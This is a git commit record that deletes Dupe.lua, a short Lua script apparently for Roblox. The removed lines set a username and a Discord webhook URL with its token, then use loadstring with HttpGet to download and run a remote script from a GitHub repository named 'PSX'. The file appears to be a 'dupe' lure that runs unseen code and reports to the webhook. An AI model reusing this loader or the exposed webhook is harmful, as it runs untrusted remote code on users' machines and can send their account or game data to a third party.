00e7a2d3fc178429b840e2652850894238388735
Radexrow <121688207+Radexrow@users.noreply.github.com>
2023-01-20 18:39:47 +0300

    Delete Dupe.lua

--- Dupe.lua
+++
@@ -1,4 +0,0 @@
-UserName = "1661323"
-WebHook = "https://discord.com/api/webhooks/1059107444825018389/aU2AeHmpHqVx6WxWONHcey9jmFscrqaVCFVbR0Tjzf2YH2De_9nFom4-sLCx5tsvuOfv"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
